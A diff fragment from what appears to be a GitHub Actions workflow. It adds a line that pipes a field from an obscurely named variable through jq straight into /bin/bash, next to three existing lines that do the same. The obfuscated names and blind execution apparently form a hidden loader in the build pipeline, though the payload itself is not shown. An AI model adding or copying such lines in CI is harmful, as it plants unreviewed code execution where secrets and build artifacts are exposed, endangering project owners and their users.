@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$bjai9712" | jq -r .txf9043 | /bin/bash
           printf '%s' "$dbf3" | jq -r .jong8 | /bin/bash
           echo $cq89 | jq -r .zaoea32 | /bin/bash
+          echo $j5 | jq -r .wcjeu82334 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
